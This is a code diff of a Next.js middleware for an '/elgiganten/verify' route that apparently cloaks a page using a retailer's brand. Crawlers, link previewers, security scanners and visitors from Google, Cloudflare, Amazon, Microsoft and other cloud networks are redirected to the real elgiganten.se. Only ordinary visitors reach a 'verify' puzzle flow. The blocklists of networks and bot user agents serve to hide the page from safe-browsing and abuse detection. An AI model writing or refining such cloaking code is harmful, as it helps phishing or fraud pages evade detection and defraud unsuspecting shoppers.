@@ -2,10 +2,11 @@
 import { NextResponse, NextRequest } from "next/server";
 
 export const config = {
+  // Run only on the verify flow
   matcher: ["/elgiganten/verify/:path*"],
 };
 
-// Blocklist (ASN codes + name/domain snippets)
+// --- Provider blocklists (ASN + name/domain snippets) ---
 const BAD_ASN = new Set<string>([
   // Google
   "AS15169", "AS396982",
@@ -24,22 +25,24 @@ const BAD_ASN = new Set<string>([
 ]);
 
 const BAD_NAME_SNIPPETS = [
-  "google", "google llc", "google cloud",
-  "cloudflare",
+  "google", "google llc", "google cloud", "googlebot",
+  "cloudflare", "cloudflare, inc",
   "amazon", "aws", "amazon.com", "amazon technologies",
   "microsoft", "azure", "bing",
-  "meta", "facebook",
+  "meta", "facebook", "facebook inc",
   "fastly",
   "akamai",
 ];
 
-// Broad bot/crawler UA detection (includes Google-CloudVertexBot)
+// --- Broad bot/crawler UA detection (incl. Vertex) ---
 const BOT_UA =
   /(bot|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;
 
 const REDIRECT_URL = "https://www.elgiganten.se";
 
+// --- Helpers ---
 function getClientIp(req: NextRequest): string | null {
+  // Respect proxies/CDN headers (Vercel/CF)
   const fwd = req.headers.get("x-forwarded-for");
   if (fwd) {
     const ip = fwd.split(",")[0]?.trim();
@@ -61,6 +64,7 @@ async function ipinfoLookup(ip: string, token?: string) {
     const res = await fetch(url, { signal: controller.signal, cache: "no-store" });
     clearTimeout(to);
     if (!res.ok) return null;
+    // IPinfo Lite returns at least ASN on many IPs; when present, we use it.
     return (await res.json()) as {
       asn?: string;
       as_name?: string;
@@ -91,7 +95,7 @@ async function maxmindLookup(req: NextRequest, ip: string) {
     const res = await fetch(url.toString(), {
       method: "GET",
       signal: controller.signal,
-      headers: { "x-mw": "1" },
+      headers: { "x-mw": "1" }, // trivial guard
       cache: "no-store",
     });
     clearTimeout(to);
@@ -103,14 +107,15 @@ async function maxmindLookup(req: NextRequest, ip: string) {
   }
 }
 
+// --- Middleware entrypoint (Edge runtime) ---
 export async function middleware(req: NextRequest) {
-  // 0) User-Agent block (bots AND real users on infra networks)
+  // 0) UA block (bots and previews) **before** any page logic
   const ua = req.headers.get("user-agent") || "";
   if (BOT_UA.test(ua)) {
     return NextResponse.redirect(REDIRECT_URL, { status: 302 });
   }
 
-  // 1) IPinfo ASN/AS name/domain check
+  // 1) IPinfo ASN/AS-name/domain check
   const ip = getClientIp(req);
   if (ip) {
     const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
@@ -125,6 +130,6 @@ export async function middleware(req: NextRequest) {
     }
   }
 
-  // Allow through
+  // 3) Allow through to the verify page flow (puzzle etc.)
   return NextResponse.next();
 }
